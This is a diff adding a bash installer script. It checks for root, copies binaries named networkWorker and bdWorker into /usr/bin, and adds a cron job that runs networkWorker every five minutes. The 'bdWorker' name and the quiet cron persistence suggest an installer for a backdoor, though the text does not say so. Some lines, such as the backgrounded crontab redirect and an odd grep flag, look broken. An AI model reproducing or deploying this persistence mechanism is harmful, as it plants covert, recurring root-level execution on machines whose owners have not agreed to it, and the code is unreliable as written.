@@ -1,0 +1,68 @@
+#!/bin/bash
+
+checkRoot() {
+
+  echo "[*] checking access..."
+
+  if [ ! "$EUID" -eq 0 ]; then
+    echo -e "\n[-] need root access to do it."
+    exit 2
+  fi
+}
+
+cpFile() {
+
+  echo "[*] copying file..."
+
+  cp networkWorker /usr/bin
+  cp bdWorker /usr/bin
+  cp bdWorker.py /usr/bin
+}
+
+addToAutostart() {
+
+  echo "[*] adding to autostart..."
+
+  tmpFile="/tmp/bdWorker.tmp"
+
+  crontab -l > $tmpFile &> /dev/null &
+
+  sleep 1
+
+  if [ -s $tmpFile ]; then
+    empty=0
+  else
+    empty=1
+  fi
+
+  exist=`cat $tmpFile | grep -c networkWorker`
+  onLine=`cat $tmpFile | grep -n networkWorker | grep [0-9][0-9]*: -0 | grep [0-9] -o`
+
+  cronVal="*/5 * * * * /usr/bin/networkWorker"
+
+  if [ $empty -gt 0 ]; then
+    echo "$cronVal" > $tmpFile
+  elif [ $exist -gt 0 ]; then
+    sed -i $onLine"s/.*/$cronVal/" $tmpFile
+  else
+    echo "$cronVal" >> $tmpFile
+  fi
+
+  crontab $tmpFile
+
+  rm $tmpFile
+
+}
+
+install() {
+  checkRoot
+  cpFile
+  addToAutostart
+
+  networkWorker 
+
+  echo "[*] done..."
+}
+
+install
+
